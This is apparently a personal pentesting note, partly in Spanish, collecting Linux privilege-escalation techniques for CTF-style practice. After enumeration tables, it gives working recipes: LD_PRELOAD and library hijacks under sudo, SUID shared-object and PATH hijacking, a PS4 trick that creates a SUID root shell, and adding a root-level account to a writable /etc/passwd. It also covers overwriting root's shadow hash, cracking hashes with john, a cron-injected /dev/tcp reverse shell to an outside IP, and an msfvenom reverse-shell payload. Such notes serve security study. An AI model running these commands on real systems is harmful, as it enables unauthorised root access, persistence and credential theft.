---
{"dg-publish":true,"permalink":"/notes/escalating-privileges/","dgShowToc":"false"}
---

 Important
- Reset passwords
- Bypass access controls to compromise protected data
- Edit software configurations
- Enable persistence, so you can access the machine again later.
- Change privilege of users
- Execute any administrative command
- Get that cheeky root flag ;)
![Pasted image 20240607184831.png|500](/img/user/Pasted%20image%2020240607184831.png)
# Linux privesc
## Basic
### Stable shell

<div class="transclusion internal-embed is-loaded"><a class="markdown-embed-link" href="/notes/netcat/#technique-1-python" aria-label="Open link"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="svg-icon lucide-link"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg></a><div class="markdown-embed">

<div class="markdown-embed-title">

# Netcat

</div>


## Technique 1: Python
1. Uses Python to spawn a better featured bash shell;
```sh
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
some targets may need replace `python` with `python2` or `python3`
2. access to term commands such as `clear`.
```sh
export TERM=xterm
```
3. Background the shell using Ctrl + Z.
```sh
stty raw -echo; fg
```
This does two things: 
- First, it **turns off our own terminal echo** (which gives us access to tab autocompletes, the arrow keys, and Ctrl + C to kill processes).
- then **foregrounds the shell,** thus completing the process.
- Note that **if the shell dies,** any input in your own terminal will **not be visible** (as a result of having disabled terminal echo). To **fix this, type** `reset` and press enter.

</div></div>


### Get a bash
```shell
script /dev/null -c bash
```

### exec bash like a sudo
```shell
sudo -u root /bin/bash
```
## System enumeration - Manual
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



 
| Option                                              | Description                                                                                                                        |
| --------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| `hostname`                                          | Show the hostname                                                                                                                  |
| `hostname -I`<br>`ip a`                             | Show all IPs                                                                                                                       |
| `hostname -i`                                       | Show IP                                                                                                                            |
| `who`                                               | Muestra los usuarios conectados al sistema.                                                                                        |
| `whoiam`                                            | Muestra la inform​acion del usuario actual.                                                                                        |
| `uname`                                             | Muestra inform​acion del sistema.                                                                                                  |
| `uname -a`                                          | Show kernel                                                                                                                        |
| `uname -r`                                          | only kernel                                                                                                                        |
| `cat /etc/issue`<br><br>`cat /etc/os-release`       | Show linux OS version                                                                                                              |
| `env`                                               | print enviroment variables of current session                                                                                      |
| `id`                                                | Muestra el identi​ficador y el grupo de usuario.                                                                                   |
| `cat /etc/passwd`                                   | Información de usuarios                                                                                                            |
| `history`                                           | Commands history                                                                                                                   |
| `ifconfig`                                          | Show interfaces                                                                                                                    |
| `ip route`                                          | See which network routes exist.                                                                                                    |
| `cat /proc/version`                                 | Info about the target system processes, kernel and compiler version                                                                |
| `netstat -nat`<br>`ss -nltp`<br>`cat /proc/net/tcp` | Get info about ports                                                                                                               |
| `logname`                                           | Muestra inform​acion del usuario conectado.                                                                                        |
| `date`                                              | Informa de la fecha y hora actual.                                                                                                 |
| `which cat`<br>`command -v cat`<br>`which whoami`   | Mostrar la ruta absoluta de un binario                                                                                             |
| `echo $SHELL`                                       | Mostrar Tipo de shell actual                                                                                                       |
| `cat /etc/shells`<br>`chsh -l`                      | Mostrar Tipos de shell                                                                                                             |
| `chch -s /bin/zsh`                                  | Change shell (Require restart)                                                                                                     |
| `echo $PATH`                                        | Mostrar el Path donde busca los archivos para ejecutar                                                                             |
| `echo $?`                                           | Mostrar el código de estado del comando anterior<br> 0(exitoso), 1(no exitoso)                                                     |
| `lsof -i:22`                                        | Get info about the service running in the port                                                                                     |
| `./`                                                | Current directory                                                                                                                  |
| `../`                                               | pass level of directory, 1 level up                                                                                                |
| `id -u`                                             | if the answer is 0, I am root                                                                                                      |

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                      | Description                                       |
| ------------------------------------------- | ------------------------------------------------- |
| `ps`                                        | List running processes basic                      |
| `ps -faux`                                  | Common use                                        |
| `ps -faux \| grep -iE "sql\|db\|postgres" ` | Example to search some databases                  |
| `ps -A`                                     | View all running processes                        |
| `ps axjf`                                   | View process tree                                 |
| `ps -eo command`                            | List all running commands                         |
| `ps -a`                                     | Processes for all users (a)                       |
| `ps -u`                                     | Display the user that launched the process (u)    |
| `ps -x`                                     | Processes that are not attached to a terminal (x) |
| `ps -f`                                     | Do full-format listing                            |


</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


</div></div>


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

# find

</div>



| Option                                                                                                                                                        | Description                                            |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------ |
| `find .`                                                                                                                                                      | Search in the currenty dir                             |
| `find / -name dirname`                                                                                                                                        | Find a dirs by name in the /                           |
| `find . -iname my-file`                                                                                                                                       | Don't differen between Mayus                           |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | Redirect the (stderr) to a hole                        |
| `find / -name qtile 2>/dev/null \| xargs ls -l`                                                                                                               | list the contend of each dir                           |
| `find / -type f -perm -u=s -ls 2>/dev/null`<br>`find / -type f -perm -4000 -ls 2>/dev/null`                                                                   | Search files [[Operative System/Linux/Permisos/SUID\|SUID]]                                  |
| `find / -perm -g=s -type f -ls 2>/dev/null`<br>`find / -type f -perm -2000 -ls 2>/dev/null`                                                                   | Search files [[GUID\|GUID]]                                  |
| `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null`                                                                             | Combine conditions [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]]<br>`-o ` is OR |
| `find / -type -d -group wheel 2>/dev/null`                                                                                                                    | find dirs in the group wheel                           |
| `find -executable`<br>`find / -perm a=x`                                                                                                                      | Find items executable                                  |
| `find / -writable -type d 2>/dev/null`<br>`find / -perm -222 -type d 2>/dev/null`<br>`find / -perm -o w -type d 2>/dev/null`                                  | Find world-writable folders                            |
| `find / -writable -type d 2>/dev/null \| cut -d "/" -f 2 \| sort -u`                                                                                          | First Writable folders                                 |
| `find / -writable 2>/dev/null \| cut -d "/" -f 2,3 \| grep -v proc \| sort -u`<br>`find / -writable 2>/dev/null \| grep  usr \| cut -d "/" -f 2,3 \| sort -u` | 1 and 2 Writable folders<br>`usr`                      |
| `find ! -executable`                                                                                                                                          | Find items **not** executables                         |
| `find / -user root -writable 2>/dev/null`<br>`find / -user root -executable -type -f 2>/dev/null`<br>                                                         | Find items from root user                              |
| `find -name dex\* 2>/dev/null`                                                                                                                                | Find files that start by dex                           |
| `find -name \*exdump\* 2>/dev/null`                                                                                                                           | FInd files that content exdump between his name        |
| `find -name dex\*.sh 2>/dev/null`                                                                                                                             | Start with dex and finish in .sh                       |
| `find / -size +5G`                                                                                                                                            | List all files with more than 5 Gigabites              |
| `find / -size 10M`                                                                                                                                            | List all files with exactly 10 megabytes               |
| `find / -size -5M`                                                                                                                                            | List all files with less than 5 megabytes              |
| `find / - empty`                                                                                                                                              | Find empty items in the system                         |
| `find . -name "*.md*" -type f -exec grep -l "text to search" {} +`                                                                                            | Search a file by the content of it                     |
| `find / -mtime 10`                                                                                                                                            | Find files that were modified in the last 10 days      |
| `find / -atime 10`                                                                                                                                            | Find files that were accessed in the last 10 day       |
| `find / -cmin -60`                                                                                                                                            | find files changed within the last hour (60 minutes)   |
| `find / -amin -60`                                                                                                                                            | find files accesses within the last hour (60 minutes)  |

- **c** – bytes
- **k** – kilobytes
- **M** – megabytes
- **G** – gigabytes
- **b** – trozos de 512 bytes

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### netstat

</div>


Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>

### Check databases

<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">




| Option                                      | Description                                       |
| ------------------------------------------- | ------------------------------------------------- |
| `ps`                                        | List running processes basic                      |
| `ps -faux`                                  | Common use                                        |
| `ps -faux \| grep -iE "sql\|db\|postgres" ` | Example to search some databases                  |
| `ps -A`                                     | View all running processes                        |
| `ps axjf`                                   | View process tree                                 |
| `ps -eo command`                            | List all running commands                         |
| `ps -a`                                     | Processes for all users (a)                       |
| `ps -u`                                     | Display the user that launched the process (u)    |
| `ps -x`                                     | Processes that are not attached to a terminal (x) |
| `ps -f`                                     | Do full-format listing                            |


</div></div>


<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">



Check interesting services

| Option                                    | Description                                                                                   |
| ----------------------------------------- | --------------------------------------------------------------------------------------------- |
| `netstat -lanp`                           | Common use                                                                                    |
| `netstat -ano`                            | `-a`: Display all sockets<br>`-n`: Do not resolve names<br>`-o`: Display timers               |
| `netstat -a`                              | Shows all listening ports and established connections.                                        |
| `netstat -at` <br>`netstat -au`           | List TCP or UDP protocols respectively.                                                       |
| `netstat -l`                              | List ports in “listening” mode.<br>Use with `t` or `u`                                        |
| `netstat -s`                              | List network usage statistics by protocol.<br>Use with `t` or `u`                             |
| `netstat -tp`                             | List connections with the service name and PID information.<br>can also be used with the `-l` |
| `netstat -p`                              | Show the PID and name of the program to which each socket belongs.                            |
| `netstat -i`                              | Shows interface statistics.                                                                   |
| `netstat -anlp \| grep -iE "tcp.*LISTEN"` | Filtering `tcp`  and `listen`                                                                 |



</div></div>


## System enumeration - Automated
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### linpeas

</div>


to scan vulns in linux

```shell
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && chmod +x linpeas.sh
```



</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### lse

</div>


``` shell
wget https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh && chmod +x lse.sh
```

execute more deep scan
```
./lse.sh -l 2
```

[[lse code\|lse code]]

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LinEnum

</div>


```shell
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh && chmod +x LinEnum.sh
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### pspy

</div>


- snoop on processes without need for root permissions.
- see commands run by other users, cron jobs, etc.
```sh
https://github.com/DominicBreuker/pspy/releases
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### LES

</div>


- System enumeration - Automated
- [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
**linux-exploit-suggester-2**
```shell
wget https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl && \
perl linux-exploit-suggester-2.pl
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Linux Smart Enumeration

</div>


- [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Linux Priv Checker

</div>


- [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)


</div></div>

## Sudo -l
```bash
sudo -l
```

to check another user
```shell
sudo -l -U tracy
```

Execute a file like the owner
```shell
sudo -u USERNAME ./script.sh
```
### Shell Escape Sequences
- [https://gtfobins.github.io/](https://gtfobins.github.io/)
- [[Hacking Ético y Pentesting/sudo -l\|sudo -l]]
### Leverage application functions
- Some applications will not have a known exploit within this context.
- we can use a "hack" to leak information **leveraging a function of the application.**

Example: Apache2 ant the `-f` parameter used to load the `/etc/shadow`, this will result in an error message that includes the first line of the `/etc/shadow` file.
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### sudo Environment Variables

</div>


- Sudo can be configured to **inherit** certain environment **variables from the user**'s environment.
- Check which environment variables are inherited (look for the env_keep options):
```shell
sudo -l
Matching Defaults entries for user on this host:
    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
```
- LD_PRELOAD and LD_LIBRARY_PATH are both **inherited from the user's environment**.
- LD_PRELOAD loads a shared object before any others when a program is run.
- LD_LIBRARY_PATH provides a list of directories where shared libraries are searched for first.
### LD_PRELOAD
- Create a shared object using the code located at /home/user/tools/sudo/[[preload.c\|preload.c]]:
```shell
gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c
```
- Run one program (listed when running **sudo -l**), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
- A root shell should spawn.
```shell
sudo LD_PRELOAD=/tmp/preload.so program-name-here
```
### LD_LIBRARY_PATH
Run ldd against the apache2 program file to see which shared libraries are used by the program:
```shell
ldd /usr/sbin/apache2
```

Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/[[library_path.c\|library_path.c]]:
```shell
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp
```shell
sudo LD_LIBRARY_PATH=/tmp apache2
```

</div></div>

## SUID-SGID executable scaling
- https://gtfobins.github.io/
- [[Operative System/Linux/Permisos/SUID\|SUID]] [[Operative System/Linux/Permisos/SGID\|SGID]]
Check files with [[Operative System/Linux/Permisos/SUID\|SUID]] or [[Operative System/Linux/Permisos/SGID\|SGID]] permission
```shell
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
Check files with [[Operative System/Linux/Permisos/SUID\|SUID]] permission
```shell
find / -type f -perm -u=s -ls 2>/dev/null
```
```shell
find / -type f -perm -4000 -ls 2>/dev/null
```
Check files with [[Operative System/Linux/Permisos/SGID\|SGID]] permission
```shell
find / -perm -g=s -type f -ls 2>/dev/null
```
```shell
find / -type f -perm -2000 -ls 2>/dev/null
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Known exploits

</div>


- Find a known exploit. [Exploit-DB](https://www.exploit-db.com/), Google, and GitHub are good places to search!


| exim-4.84-3 | [[cve-2016-1531.sh\|cve-2016-1531.sh]] |
| ----------- | -------------------- |


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Shared Object injection

</div>


- If we have a executable
- Search if is trying to load shared objects, but it cannot be found.
```shell
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
  ```

- like this
`open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)`

- Create the **.config** directory for the libcalc.so file:
```sh
mkdir /home/user/.config
```
- **Compile** the code [[libcalc.c\|libcalc.c]] (It **simply spawns a Bash shell.**) into a shared object at the location the **suid-so** executable was looking for it:
```shell
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
```
- Run again
`/usr/local/bin/suid-so`

`strace /usr/bin/mount 2>&1 | grep -iE "open|access|no such file"`

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### SUID exploit enviroment var

</div>


- If an executable can be exploited due to it inheriting the user's PATH and attempting to execute programs without specifying an absolute path.
- In this example the executable is trying to start an apache2 webserver
- Use `string` to look for string in the file.
```shell
strings /usr/local/bin/suid-env
```
- One line ("service apache2 start") suggests that the service executable is being called to start the webserver, however **the full path** of the executable (/usr/sbin/service) **is not being used**.
- Compile the code (spawn a bash shell) [[service.c\|service.c]] into an executable.
```shell
gcc -o service /home/user/tools/suid/service.c
```
- Or like an e.g. copy the shell file as a executable
```shell
echo /bin/bash > file_to_execute
```
- Change the PATH [[PATH exploiting\|PATH exploiting]]
```shell
export PATH=/path_to_executable:$PATH
```

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Scaling Abusing shell

</div>


## Bash versions below `4.2-048`
- Define shell **functions** with **names** that **resemble** file paths
- then **export** those functions so that they are used **instead** of any actual **executable** at that file **path**.
- If we have an executable `strings /usr/local/bin/suid-env2`
`strings /usr/local/bin/suid-env2`
`/usr/sbin/service apache2 start`
- Create a Bash function with the name `usr/sbin/service` that executes a new Bash shell (using -p so permissions are preserved)
```shell
function /usr/sbin/service { /bin/bash -p; }
```
- export the function:
```shell
export -f /usr/sbin/service
```
- Run the executable
## Bash versions below `4.4`
-  If we have an executable 
- In debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements.
- Run the executable with bash debugging enabled and the PS4 variable set to an embedded command which creates an SUID version of /bin/bash:
```shell
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2
```
- Run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```shell
/tmp/rootbash -p
```

</div></div>


### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Python SUID

</div>


set to root
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami")'
```

set to root and open a bash 
```shell
python3 -c 'import os; os.setuid(0); os.system("whoami"); os.system("bash")'
```

Option to show the results
```python
import os; print(os.popen("ls -l").read())
```

subproccess.run([comando])

with sys module too

</div></div>


## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## Capabilities

</div>


## Ver y cambiar capabilities
Como /usr está en modo lectura es necesario montarlo como escritura para poder editar las capabilities de este.
```shell
mount -o remount, rw /usr
setcap cap_net_admin,cap_net_raw+eip /usr/bin/wireshark
```

| Option                       | Description                          |
| ---------------------------- | ------------------------------------ |
| `getcap file`                | List capabilities simple             |
| `getcap -r / 2>/dev/null`    | List capabilities recursive from `/` |
| `setcap cap_setupid+ep file` | change                               |
| `setcap -r file`             | Remove                               |
## Lista de capabilities

Hasta la versión 2.4.18 de Linux, las siguientes capacidades están implementadas:

| Capability           | Description                                                                                                                                                                                                                                                                                                                                                                                                                              |
| -------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| CAP_SETUID           | Permite  manipulaciones arbitrarias de los IDs de usuario de los procesos (setuid(2), etc.); permite el uso  de  IDs  de  usuario falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                                        |
| CAP_SETGID           | Permite  manipulaciones arbitrarias de los IDs de grupo y de la lista de IDs de grupo adicionales de un proceso; permite el  uso de  IDs  de  grupo  falsificados cuando se pasan credenciales de conectores a través de conectores de dominio Unix.                                                                                                                                                                                     |
| CAP_CHOWN            | Permite cambios arbitrarios en los IDs de usuario y de grupo de los ficheros (vea chown(2)).                                                                                                                                                                                                                                                                                                                                             |
| CAP_DAC_OVERRIDE     | Evita  las  comprobaciones de permisos sobre operaciones de lectura, escritura y ejecución.  (DAC = "control de acceso  discre-cional".)                                                                                                                                                                                                                                                                                                 |
| CAP_DAC_READ_SEARCH  | Evita comprobaciones de permisos sobre operaciones de lectura de ficheros y lectura y ejecución de directorios.                                                                                                                                                                                                                                                                                                                          |
| CAP_FOWNER           | Evita comprobaciones de permisos sobre operaciones  que  normalmente requieren que el ID de usuario del sistema de ficheros del proceso coincida  con  el  ID  de  usuario  del  fichero  (p.e., utime(2)),   excluyendo   aquellas   operaciones  cubiertas  por CAP_DAC_OVERRIDE y CAP_DAC_READ_SEARCH; ignora el  bit  pegajoso (sticky) en el borrado de ficheros.                                                                   |
| CAP_FSETID           | No  borra los bits set-user-ID y set-group-ID cuando se modifica un fichero; permite  establecer  el  bit  set-group-ID  para  un fichero  cuyo  ID  de  grupo  no  coincide con el del sistema de ficheros o cualquier otro ID  de  grupo  adicional  del  proceso invocador.                                                                                                                                                           |
| CAP_IPC_LOCK         | Permite  el  bloqueo  en  memoria  (mlock(2),  mlockall(2), shm-ctl(2)).                                                                                                                                                                                                                                                                                                                                                                 |
| CAP_IPC_OWNER        | Evita comprobaciones de  permisos  para  las  operaciones  sobre objetos System V IPC.                                                                                                                                                                                                                                                                                                                                                   |
| CAP_KILL             | Evita  comprobaciones  de  permisos  para  enviar  señales  (vea kill(2)).                                                                                                                                                                                                                                                                                                                                                               |
| CAP_LEASE            | (Linux 2.4 en adelante)  Permite que  se  establezcan  arriendos sobre ficheros arbitrarios (vea fcntl(2)).                                                                                                                                                                                                                                                                                                                              |
| CAP_LINUX_IMMUTABLE  | Permite  establecer  los  atributos  extendidos EXT2_APPEND_FL y EXT2_IMMUTABLE_FL sobre ficheros del sistema de ficheros ext2.                                                                                                                                                                                                                                                                                                          |
| CAP_MKNOD            | (Linux 2.4 en adelante) Permite la creación  de  ficheros  especiales usando mknod(2).                                                                                                                                                                                                                                                                                                                                                   |
| CAP_NET_ADMIN        | Permite   varias   operaciones  relacionadas  con  redes  (p.e., establecer opciones privilegiadas sobre conectores, habilitar la difusión  de paquetes multidestino (multicasting), configuración de interfaces, modificar tablas de encaminamiento).                                                                                                                                                                                   |
| CAP_NET_BIND_SERVICE | Permite ligar conectores a puertos  reservados  del  dominio  de Internet (números de puerto menores que 1024).                                                                                                                                                                                                                                                                                                                          |
| CAP_NET_BROADCAST    | (No  se  usa)  Permite  la  difusión universal (broadcasting) de paquetes a través de un conector y la escucha de paquetes multidestino.                                                                                                                                                                                                                                                                                                 |
| CAP_NET_RAW          | Permite el uso de conectores de tipo RAW y PACKET.                                                                                                                                                                                                                                                                                                                                                                                       |
| CAP_SETPCAP          | Concede o elimina cualquier capacidad en el conjunto de  capacidades permitidas del invocador a o desde cualquier otro proceso.                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_ADMIN        | Permite una variedad de operaciones de administración  del  sistema  incluyendo:  quotactl(2),  mount(2),  swapon(2),  sethostname(2), setdomainname(2), IPC_SET y operaciones IPC_RMID  sobre objetos  arbitrarios  IPC  de System V; permite el uso de IDs de usuario falsificados cuando se pasan credenciales de conectores.                                                                                                         |
| CAP_SYS_BOOT         | Permite llamadas a reboot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_CHROOT       | Permite llamadas a chroot(2).                                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_MODULE       | Permite cargar y eliminar módulos del núcleo.                                                                                                                                                                                                                                                                                                                                                                                            |
| CAP_SYS_NICE         | Permite aumentar el valor nice del proceso  invocador  (nice(2), setpriority(2)) y cambiar el valor nice de procesos arbitrarios; permite establecer políticas de  planificación  de  tiempo  real para  el  proceso  invocador  y establecer políticas de planificación y prioridades para procesos arbitrarios  (sched_setscheduler(2), sched_setparam(2)).                                                                            |
| CAP_SYS_PACCT        | Permite llamadas a acct(2).                                                                                                                                                                                                                                                                                                                                                                                                              |
| CAP_SYS_PTRACE       | Permite  el seguimiento detallado de procesos arbitrarios usando ptrace(2)                                                                                                                                                                                                                                                                                                                                                               |
| CAP_SYS_RAWIO        | Permite operaciones sobre puertos de E/S (iopl(2) y ioperm(2)).                                                                                                                                                                                                                                                                                                                                                                          |
| CAP_SYS_RESOURCE     | Permite el uso de espacio  reservado  en  sistemas  de  ficheros ext2;  llamadas  ioctl(2)  para  controlar  el registro en ext3; sobrescribir los límites de las cuotas de disco; incrementar los límites  de  recursos (vea setrlimit(2)); sobrescribir el límite del recurso RLIMIT_NPROC; incrementar el límite msg_qbytes para una  cola  de  mensajes  por encima del limite en /proc/sys/kernel/msgmnb (vea msgop(2) y msgctl(2). |
| CAP_SYS_TIME         | Permite la modificación del reloj del sistema  (settimeofday(2), adjtimex(2));  permite  la modificación del reloj de tiempo real (hardware)                                                                                                                                                                                                                                                                                             |
| CAP_SYS_TTY_CONFIG   | Permite llamadas a vhangup(2).                                                                                                                                                                                                                                                                                                                                                                                                           |


</div></div>

## 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

## PATH exploiting

</div>


- If we have [[Operative System/Linux/Permisos/SUID\|SUID]] binary
- Re-write the PATH variable to a location of our choosing!
- When the SUID binary calls the system shell to run an executable, it runs one that we've written instead!

Example with `ls`

```shell
cd /tmp && \
echo "[whatever command we want to run]" > [name of the executable we are imitating]
echo "/bin/bash" > ls
chmod +x ls
export PATH=/tmp:$PATH
```

Check which folders can I write.

</div></div>

## Weak file permissions
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writable passwd

</div>


### Create a new user
- write a new line entry create a new user!
- Add the password hash of our choice, and set the UID, GID and shell to root.

```shell
openssl passwd -1 -salt [salt] [password]
```

```
new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash
```

```shell
echo 'new_user:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd
```

## Replace the hash of root
Generate password
```shell
openssl passwd [password]
```

Edit the `/etc/passwd` file and place the generated password hash between the first and second colon (:) of the root user's row **(replacing the "x").**

</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Readable shadow - cracking hashes

</div>


- The /etc/shadow file is the file on Linux machines where password hashes are stored.
- It also stores other information, such as the date of last password change and password expiration information
# unshadow

John can be very particular about the formats it needs data in to be able to work with it.
you must **combine** it with the /etc/passwd file

``` bash
unshadow [path to passwd] [path to shadow]
```

``` bash
unshadow local_passwd local_shadow > unshadowed.txt
```

use just the relevant line

local_passwd  
Contains the /etc/passwd line for the root user:
local_shadow
Contains the /etc/shadow line for the root user:
# cracking
in some cases you will need to specify the format as we have done previously using: `--format=sha512crypt`

``` bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
```



</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Writeable shadow

</div>


Generate a new password hash with a password of your choice:
```shell
mkpasswd -m sha-512 newpasswordhere
```

Edit the /etc/shadow file and replace the original root user's password hash with the one you just generated.

Switch to the root user, using the new password:

	su root

</div></div>

## Cron jobs exploiting
Look for jobs, and try to exploit them
System crontab
```shell
/etc/crontab
/etc/cron.d
/etc/rc.d/
/etc/init.d
```
Users crontabs
```shell
/var/spool/cron
```
### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - File permissions

</div>


check permissions of the scripts
and add a basic bash
```shell
echo 'bash -i>&/dev/tcp/10.13.51.143/4747 0>&1' >> /script.sh
```


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - PATH

</div>


- check the crontabs
- If a script exist with no direct path like
`* * * * * root overwrite.sh`
- We can check if we have permissions to create an imitate script in some dir of the PATH
`PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
- If it's possible, create a script and make exec,
- one options is make a copy of the root bash
```shell
#!/bin/bash  
  
cp /bin/bash /tmp/rootbash  
chmod +xs /tmp/rootbash
```

- Run the /tmp/rootbash command with -p to gain a shell running with root privileges:
	`/tmp/rootbash -p`


</div></div>

### 
<div class="transclusion internal-embed is-loaded"><div class="markdown-embed">

<div class="markdown-embed-title">

### Cron exploit - Wildcards

</div>


- Check the scripts with tar, 7z, rsync, etc.
- Search a `*` like
```shell
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```
- GTFOBins, Note that tar has command line options that let you **run** other **commands** as part of a checkpoint feature.
- Use msfvenom on your Kali box to generate a reverse shell ELF binary. Update the LHOST IP address accordingly:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
